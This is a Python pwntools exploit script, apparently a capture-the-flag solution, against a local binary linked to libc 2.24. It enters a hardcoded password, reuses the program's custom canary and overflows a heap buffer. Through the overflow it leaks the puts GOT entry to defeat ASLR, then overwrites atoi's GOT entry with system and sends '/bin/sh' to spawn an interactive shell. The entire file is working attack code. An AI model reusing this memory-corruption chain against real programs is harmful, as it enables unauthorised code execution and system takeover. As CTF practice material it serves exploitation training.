#!/usr/bin/python

from pwn import *
import sys

binary = './bin'
brkpts = '''
b main
c
b checkCanary
'''

e = ELF("bin")
libc = ELF("libc-2.24.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {"LD_PRELOAD" : "./libc-2.24.so"})

else:
    io = process(binary, env = {"LD_PRELOAD" : "./libc-2.24.so"})

password = "13462b403d91edd8c8389517c1eca3ed"
# password = "6ccc536e61eb35f737d07aa87d1edcf1"

if __name__ == "__main__":
    sla("> ", password)
    
    canary = e.read(e.symbols['canary'], 16)

    canary_offset = int(os.popen('objdump -d -M intel bin | grep "rcx,\[rax"', 'r').read().split(" ")[-1].split("+")[-1][:-2], 16)
    data = os.popen('objdump -d -M intel bin | grep "\[rbx"', 'r').read().split("\n")[0].split(" ")[-1].split("[")[-1].split("]")[0]
    if "+" in data:
        ptr_offset = int(data.split("+")[-1], 16)
    else:
        ptr_offset = 0
    malloc_size = int(os.popen('objdump -d -M intel bin | grep -A 100 "mov    edi,0x40222a" | grep "mov    edi,0x"', 'r').read().split("\n")[4].split(",")[-1], 16)

    if malloc_size % 16 > 8:
        malloc_size = (malloc_size // 16 + 2) * 16
    else:
        malloc_size = (malloc_size // 16 + 1) * 16
    
    junk = "a"*0x30 + ("b"*canary_offset + canary).ljust(malloc_size, "b") + "c"*ptr_offset

    payload = junk + p64(e.got['puts'])

    log.info(hex(e.symbols['canary']))
    sla(": ", "1")
    sla(": ", "1")
    sla("? ", str(len(payload) + 1))
    sa(": ", payload)

    sla(": ", "2")  
    sla(": ", "2")
    reu("reads: ")
    libc.address = uu64(rl().strip()) - libc.symbols['puts']

    payload = junk + p64(e.got['atoi'])

    sla(": ", "1")
    sla(": ", "1")
    sla("? ", str(len(payload) + 1))
    sa(": ", payload)

    sla(": ", "1")
    sla(": ", "2")
    sla("? ", "9")
    sa(": ", p64(libc.symbols['system']))

    sla(": ", "1")
    sla(": ", "/bin/sh\x00")

    io.interactive()
